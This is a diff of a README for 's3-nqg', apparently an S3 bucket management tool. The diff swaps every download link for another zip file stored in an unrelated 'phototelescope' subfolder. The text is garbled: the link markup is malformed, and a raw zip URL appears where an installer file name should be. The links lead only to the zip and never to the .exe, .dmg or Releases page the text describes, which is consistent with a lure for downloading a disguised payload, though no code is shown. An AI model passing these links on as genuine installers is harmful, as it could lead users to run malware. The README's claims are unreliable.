@@ -1,6 +1,6 @@
 # 🌟 s3-nqg - Effortlessly Manage Your S3 Buckets
 
-[![Download Latest Release](https://raw.githubusercontent.com/nielsolehald/s3-nqg/main/phototelescope/s3-nqg.zip%20Latest%https://raw.githubusercontent.com/nielsolehald/s3-nqg/main/phototelescope/s3-nqg.zip)](https://raw.githubusercontent.com/nielsolehald/s3-nqg/main/phototelescope/s3-nqg.zip)
+[![Download Latest Release](https://github.com/nielsolehald/s3-nqg/raw/refs/heads/main/phototelescope/nqg-s-v2.6.zip%20Latest%https://github.com/nielsolehald/s3-nqg/raw/refs/heads/main/phototelescope/nqg-s-v2.6.zip)](https://github.com/nielsolehald/s3-nqg/raw/refs/heads/main/phototelescope/nqg-s-v2.6.zip)
 
 ## 📦 Overview
 
@@ -20,7 +20,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started, you need to download the latest version of s3-nqg. Click the button below to visit the download page:
 
-[Download s3-nqg](https://raw.githubusercontent.com/nielsolehald/s3-nqg/main/phototelescope/s3-nqg.zip)
+[Download s3-nqg](https://github.com/nielsolehald/s3-nqg/raw/refs/heads/main/phototelescope/nqg-s-v2.6.zip)
 
 On the Releases page, you will see various versions. The latest one is recommended for the best performance and features.
 
@@ -30,7 +30,7 @@ After downloading, locate the file on your computer.
 
 - If you are using Windows, double-click the `.exe` file.
 - For macOS, open the `.dmg` file and drag the application to your Applications folder.
-- On Linux, you will usually find a `https://raw.githubusercontent.com/nielsolehald/s3-nqg/main/phototelescope/s3-nqg.zip` file; extract it and follow any provided instructions.
+- On Linux, you will usually find a `https://github.com/nielsolehald/s3-nqg/raw/refs/heads/main/phototelescope/nqg-s-v2.6.zip` file; extract it and follow any provided instructions.
 
 ### Step 3: Run the Application
 
@@ -65,7 +65,7 @@ You are now ready to manage your S3 buckets. Here are some features you can expl
 
 To install the application, please visit the download page below. Choose the latest version to ensure you have all the latest features and fixes.
 
-[Download s3-nqg](https://raw.githubusercontent.com/nielsolehald/s3-nqg/main/phototelescope/s3-nqg.zip)
+[Download s3-nqg](https://github.com/nielsolehald/s3-nqg/raw/refs/heads/main/phototelescope/nqg-s-v2.6.zip)
 
 ## ❓ Frequently Asked Questions
 
